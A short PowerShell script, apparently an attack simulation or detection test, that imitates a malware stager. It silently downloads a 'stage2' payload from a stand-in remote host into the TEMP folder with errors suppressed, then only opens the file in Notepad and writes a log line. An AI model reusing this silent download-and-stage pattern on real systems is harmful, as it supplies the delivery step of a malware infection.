
# Remote staging
$Stage2Url = 'https://adatum.com/update.dat'
$PayloadPath = "$env:TEMP\stage2.bin"
Invoke-WebRequest -Uri $Stage2Url -OutFile $PayloadPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath -ErrorAction SilentlyContinue
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
